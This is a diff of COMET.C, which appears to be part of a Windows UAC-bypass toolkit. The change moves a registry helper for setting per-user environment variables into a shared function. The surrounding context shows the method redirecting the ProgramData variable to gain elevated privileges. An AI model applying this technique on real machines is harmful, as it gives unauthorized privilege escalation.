@@ -4,9 +4,9 @@
 *
 *  TITLE:       COMET.C
 *
-*  VERSION:     2.70
+*  VERSION:     2.72
 *
-*  DATE:        25 Mar 2017
+*  DATE:        25 May 2017
 *
 *  Comet method (c) BreakingMalware
 *  For description please visit original URL 
@@ -21,55 +21,6 @@
 #include "global.h"
 #include <ShlGuid.h>
 #include <ShObjIdl.h>
-
-/*
-* ucmSetEnvVariable
-*
-* Purpose:
-*
-* Remove or set current user environment variable.
-*
-*/
-BOOL ucmSetEnvVariable(
-    _In_ BOOL fRemove,
-    _In_ LPWSTR lpVariableName,
-    _In_opt_ LPWSTR lpVariableData
-)
-{
-    BOOL	bResult = FALSE, bCond = FALSE;
-    HKEY    hKey = NULL;
-    DWORD   cbData;
-
-    do {
-        if (lpVariableName == NULL)
-            break;
-
-        if ((lpVariableData == NULL) && (fRemove == FALSE))
-            break;
-
-        if (RegOpenKey(HKEY_CURRENT_USER, L"Environment", &hKey) != ERROR_SUCCESS)
-            break;
-
-        if (fRemove) {
-            RegDeleteValue(hKey, lpVariableName);
-        }
-        else {
-            cbData = (DWORD)((1 + _strlen(lpVariableData)) * sizeof(WCHAR));
-            if (RegSetValueEx(hKey, lpVariableName, 0, REG_SZ, 
-                (BYTE*)lpVariableData, cbData) != ERROR_SUCCESS)
-            {
-                break;
-            }
-        }
-        bResult = TRUE;
-
-    } while (bCond);
-
-    if (hKey != NULL)
-        RegCloseKey(hKey);
-
-    return bResult;
-}
 
 /*
 * ucmCometMethod
@@ -125,7 +76,7 @@ BOOL ucmCometMethod(
                 break;
         }
 
-        if (!ucmSetEnvVariable(FALSE, T_PROGRAMDATA, szCombinedPath))
+        if (!supSetEnvVariable(FALSE, T_PROGRAMDATA, szCombinedPath))
             break;
 
         _strcat(szCombinedPath, TEXT("\\Microsoft"));
@@ -203,6 +154,6 @@ BOOL ucmCometMethod(
     }
 #endif
 
-    ucmSetEnvVariable(TRUE, T_PROGRAMDATA, NULL);
+    supSetEnvVariable(TRUE, T_PROGRAMDATA, NULL);
     return bResult;
 }
